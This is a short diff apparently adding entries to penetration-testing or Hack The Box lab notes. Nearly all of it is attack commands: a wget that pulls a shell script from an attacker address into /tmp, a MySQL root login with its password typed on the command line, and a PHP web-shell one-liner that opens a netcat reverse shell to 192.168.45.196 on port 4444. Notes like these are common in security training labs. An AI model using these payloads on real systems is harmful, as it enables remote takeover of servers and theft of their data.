@@ -21,15 +21,15 @@ cd /tmp && wget http://192.168.45.196:22/shell.sh
 ```
 
 ```
-
+Retric@htb[/htb]$ mysql -u root -psdfquelw0kly9jgbx92
 ```
 
 ```
-
+wget http://192.168.45.196:8888/[file]
 ```
 
 ```
-
+<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.196 4444 >/tmp/f");?>
 ```
 
 ```
